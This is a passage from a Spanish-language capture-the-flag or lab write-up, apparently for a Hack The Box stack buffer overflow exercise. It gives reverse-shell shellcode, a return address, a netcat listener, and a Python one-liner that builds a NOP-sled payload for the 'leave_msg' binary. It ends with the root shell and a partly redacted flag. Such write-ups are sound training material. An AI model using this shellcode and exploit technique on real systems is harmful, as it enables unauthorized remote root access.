Shellcode = "\xdb\xc5\xd9\x74\x24\xf4\xbf\xb5\x28\xa8\x8f\x5d\x29\xc9\xb1\x12\x31\x7d\x17\x83\xc5\x04\x03\xc8\x3b\x4a\x7a\x03\xe7\x7d\x66\x30\x54\xd1\x03\xb4\xd3\x34\x63\xde\x2e\x36\x17\x47\x01\x08\xd5\xf7\x28\x0e\x1c\x9f\xd5\xf0\xde\x5e\x42\xf3\xde\x1a\xfb\x7a\x3f\x6a\x9d\x2c\x91\xd9\xd1\xce\x98\x3c\xd8\x51\xc8\xd6\x8d\x7e\x9e\x4e\x3a\xae\x4f\xec\xd3\x39\x6c\xa2\x70\xb3\x92\xf2\x7c\x0e\xd4"
      EIP = "\xdc\xd6\xff\xff"
```

{% endcode %}

### 9. Exploit final:

{% code title="En una pestaña" %}

```bash
htb-student@nixbof32skills: nc -nlvp 31337
```

{% endcode %}

{% code title="En otra pestaña" overflow="wrap" %}

```python
htb-student@nixbof32skills:~$ ./leave_msg $(python -c 'print("\x55" * (2064 - 100 - 95 - 4) + "\x90" * 100 + "\xdb\xc5\xd9\x74\x24\xf4\xbf\xb5\x28\xa8\x8f\x5d\x29\xc9\xb1\x12\x31\x7d\x17\x83\xc5\x04\x03\xc8\x3b\x4a\x7a\x03\xe7\x7d\x66\x30\x54\xd1\x03\xb4\xd3\x34\x63\xde\x2e\x36\x17\x47\x01\x08\xd5\xf7\x28\x0e\x1c\x9f\xd5\xf0\xde\x5e\x42\xf3\xde\x1a\xfb\x7a\x3f\x6a\x9d\x2c\x91\xd9\xd1\xce\x98\x3c\xd8\x51\xc8\xd6\x8d\x7e\x9e\x4e\x3a\xae\x4f\xec\xd3\x39\x6c\xa2\x70\xb3\x92\xf2\x7c\x0e\xd4" + "\xdc\xd6\xff\xff")')
```

{% endcode %}

### 10. Recibimos la shell:

```sh
htb-student@nixbof32skills:~$ nc -nlvp 31337
Listening on [0.0.0.0] (family 0, port 31337)

Connection from 127.0.0.1 45454 received!
ls
leave_msg
msg.txt
id
uid=0(root) gid=1001(htb-student) groups=1001(htb-student)
whoami
root
cd /root
ls
flag.txt
cat flag.txt
HTB{wmcaJe4dEFZ3pbgDEpToJxFwvTE...}
```
